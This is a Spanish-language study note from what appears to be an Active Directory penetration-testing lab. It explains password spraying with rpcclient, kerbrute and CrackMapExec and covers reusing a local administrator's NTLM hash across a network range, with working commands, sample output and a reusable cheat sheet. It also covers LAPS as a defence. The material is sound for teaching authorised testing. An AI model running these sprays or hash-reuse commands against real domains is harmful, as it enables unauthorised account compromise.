
## 1. Objetivo

El **Password Spraying** consiste en probar una misma contraseña contra múltiples usuarios para identificar credenciales válidas, reduciendo el riesgo de bloqueo que supondría probar muchas contraseñas contra una sola cuenta.

En esta sección se muestran tres herramientas para realizar el ataque desde Linux:

- `rpcclient`
    
- `kerbrute`
    
- `CrackMapExec`
    

También se explica cómo detectar la reutilización de contraseñas de administradores locales entre distintos equipos de la red.

> **Importante:** realiza estas pruebas únicamente en laboratorios o sistemas para los que tengas autorización.

---

## 2. Password Spraying con rpcclient

Podemos utilizar `rpcclient` para probar una contraseña contra una lista de usuarios.

### Comando

```
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

### Explicación

- `valid_users.txt`: archivo que contiene los usuarios objetivo.
    
- `"$u%Welcome1"`: utiliza el usuario actual y la contraseña `Welcome1`.
    
- `-c "getusername;quit"`: ejecuta los comandos indicados y finaliza la sesión.
    
- `172.16.5.5`: dirección IP del controlador de dominio.
    
- `grep Authority`: filtra la salida para identificar las respuestas que indican una autenticación correcta.
    

### Ejemplo de resultado

```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

En este ejemplo, los usuarios `tjohnson` y `sgage` han autenticado correctamente.

**Concepto clave:** según el material, una autenticación válida con `rpcclient` puede identificarse mediante el campo `Authority Name`.

## 3. Password Spraying con Kerbrute

Otra alternativa es utilizar `kerbrute` para probar una contraseña contra una lista de usuarios mediante Kerberos.

### Comando

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`passwordspray`|Ejecuta un ataque de pulverización de contraseñas.|
|`-d inlanefreight.local`|Especifica el dominio de Active Directory.|
|`--dc 172.16.5.5`|Indica la dirección IP del controlador de dominio.|
|`valid_users.txt`|Archivo con la lista de usuarios.|
|`Welcome1`|Contraseña que se probará.|

### Ejemplo de resultado

```
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```

La salida confirma que se ha encontrado una combinación válida de usuario y contraseña.

**Ventaja:** Kerbrute permite realizar la prueba a través de Kerberos sin depender de una autenticación SMB para cada intento.

## 4. Password Spraying con CrackMapExec

`CrackMapExec` permite probar una contraseña contra múltiples usuarios mediante SMB.

### Comando

```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`smb`|Selecciona el protocolo SMB.|
|`172.16.5.5`|Controlador de dominio objetivo.|
|`-u valid_users.txt`|Archivo con los usuarios que se probarán.|
|`-p Password123`|Contraseña que se probará contra los usuarios.|
|`grep +`|Filtra la salida para mostrar las líneas que contienen `+`, utilizadas por la herramienta para señalar autenticaciones correctas.|

### Ejemplo de resultado

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

En este caso, la contraseña `Password123` es válida para el usuario `avazquez`.

---

## 5. Validar las credenciales encontradas

Una vez obtenidas unas credenciales válidas, podemos comprobarlas individualmente contra el controlador de dominio.

### Comando

```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Resultado esperado

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

La línea con `[+]` confirma que las credenciales son válidas para la autenticación SMB en ese sistema.

**Importante:** que las credenciales sean válidas no significa necesariamente que el usuario tenga privilegios administrativos.

## 6. Reutilización de contraseñas de administrador local

La reutilización de contraseñas locales ocurre cuando varios equipos comparten la misma contraseña para sus cuentas de administrador local.

Esto puede suceder debido al uso de imágenes de instalación comunes (_gold images_) y a configuraciones automatizadas que establecen las mismas credenciales en varios sistemas.

Si conseguimos la contraseña en texto plano o el hash NTLM de una cuenta de administrador local, podemos comprobar si esas credenciales funcionan en otros equipos autorizados de la red.

### Equipos que conviene priorizar

El material recomienda prestar atención a sistemas de alto valor, como:

- Servidores SQL.
    
- Servidores Microsoft Exchange.
    
- Otros servidores donde puedan existir sesiones de usuarios privilegiados o credenciales almacenadas en memoria.
    

### Reutilización de contraseñas similares

También conviene comprobar, cuando esté autorizado, si se reutilizan contraseñas entre cuentas relacionadas.

Ejemplos:

- Una cuenta de administrador local de escritorio y la correspondiente cuenta de administrador de servidor.
    
- Una cuenta local llamada `bsmith` y una cuenta de dominio con el mismo nombre.
    
- Una cuenta de dominio `ajones` y una cuenta privilegiada `ajones_adm`.
    
- Usuarios con nombres iguales o similares pertenecientes a distintos dominios de confianza.
    

Estas posibilidades son hipótesis que deben comprobarse; no garantizan que las contraseñas coincidan.

## 7. Password Spraying con un hash NTLM

En ocasiones no obtenemos la contraseña en texto plano, sino el hash NTLM de una cuenta de administrador local recuperado de la base de datos SAM de un equipo.

Podemos comprobar si ese hash permite autenticarse en otros equipos que reutilizan la misma contraseña.

### Comando del laboratorio

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`smb`|Utiliza SMB para la autenticación.|
|`--local-auth`|Fuerza la autenticación con cuentas locales, en lugar de utilizar las credenciales del dominio.|
|`172.16.5.0/23`|Rango de red contra el que se comprueban las credenciales.|
|`-u administrator`|Especifica el nombre de usuario local.|
|`-H <HASH_NTLM>`|Utiliza un hash NTLM en lugar de una contraseña en texto plano.|
|`grep +`|Filtra las líneas que indican autenticaciones correctas.|

### Ejemplo de resultado

```
SMB  172.16.5.50   445  ACADEMY-EA-MX01   [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.25   445  ACADEMY-EA-MS01   [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.125  445  ACADEMY-EA-WEB0   [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

En el ejemplo, las credenciales permiten autenticarse como administrador local en tres equipos.

### ¿Por qué es importante `--local-auth`?

La opción `--local-auth` evita que la herramienta intente utilizar las credenciales como una cuenta del dominio actual.

**Aclaración importante:** el material indica que esta opción limita a un único intento de autenticación por equipo y ayuda a evitar bloqueos. No debe interpretarse como una garantía absoluta contra cualquier bloqueo: hay que considerar la configuración del entorno y las cuentas utilizadas.

---

## 8. Interpretar los resultados

|Resultado|Significado|
|---|---|
|`[+]`|La herramienta indica que la autenticación ha sido correcta.|
|`VALID LOGIN`|Kerbrute ha identificado una combinación válida de usuario y contraseña.|
|`(Pwn3d!)`|CrackMapExec indica que dispone de privilegios administrativos o acceso privilegiado reconocido en ese sistema.|
|Credenciales válidas sin `(Pwn3d!)`|La autenticación funciona, pero no se ha confirmado el acceso administrativo.|

Tras encontrar credenciales válidas, el siguiente paso consiste en enumerar los sistemas accesibles y comprobar qué permisos tiene la cuenta.

---

## 9. Riesgos y medidas defensivas

La reutilización de contraseñas de administrador local es un problema importante porque permite que la intrusión en un equipo facilite el acceso a otros.

Además, probar credenciales contra muchos sistemas puede generar una cantidad considerable de eventos de autenticación, por lo que esta técnica puede resultar ruidosa y poco adecuada para evaluaciones que requieran sigilo.

### Mitigación: Microsoft LAPS

**Microsoft LAPS (Local Administrator Password Solution)** permite gestionar las contraseñas de las cuentas de administrador local y utilizar contraseñas únicas por equipo, con rotación según la configuración establecida.

Esto reduce el riesgo de que una única contraseña o su hash permitan acceder a múltiples máquinas.

---

## 10. Flujo de trabajo para el laboratorio

1. Crear una lista de usuarios válidos en `valid_users.txt`.
    
2. Consultar la política de contraseñas del dominio y tener en cuenta los posibles bloqueos.
    
3. Seleccionar una única contraseña para la prueba.
    
4. Ejecutar el Password Spraying con `rpcclient`, Kerbrute o CrackMapExec.
    
5. Identificar las autenticaciones correctas.
    
6. Validar las credenciales encontradas contra el controlador de dominio.
    
7. Comprobar los permisos de la cuenta sin asumir que una autenticación correcta equivale a privilegios administrativos.
    
8. En un escenario autorizado, comprobar si existen contraseñas de administrador local reutilizadas.
    
9. Documentar los sistemas afectados y las credenciales que deben rotarse.

## Chuleta rápida

### Password Spraying con rpcclient

```
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP_DC> | grep Authority
done
```

### Password Spraying con Kerbrute

```
kerbrute passwordspray -d <DOMINIO> --dc <IP_DC> <LISTA_USUARIOS> <CONTRASEÑA>
```

### Password Spraying con CrackMapExec

```
sudo crackmapexec smb <IP_DC> -u <LISTA_USUARIOS> -p '<CONTRASEÑA>' | grep +
```

### Validar una credencial

```
sudo crackmapexec smb <IP_DC> -u <USUARIO> -p '<CONTRASEÑA>'
```

### Probar un hash NTLM contra cuentas locales

```
sudo crackmapexec smb --local-auth <RANGO_RED> -u administrator -H <HASH_NTLM> | grep +
```

### Conceptos que debes recordar

- **Password Spraying:** una contraseña contra múltiples usuarios.
    
- `**rpcclient**`**:** permite identificar autenticaciones válidas mediante su salida.
    
- **Kerbrute:** permite probar credenciales mediante Kerberos.
    
- **CrackMapExec:** permite realizar pruebas de autenticación SMB con usuarios, contraseñas o hashes.
    
- `**--local-auth**`**:** distingue la autenticación local de la autenticación con cuentas del dominio.
    
- `**(Pwn3d!)**`**:** indica acceso privilegiado reconocido por la herramienta.
    
- **LAPS:** ayuda a evitar la reutilización de contraseñas de administrador local.
    
- **Precaución:** las pruebas de autenticación pueden provocar bloqueos de cuentas y generar eventos detectables.
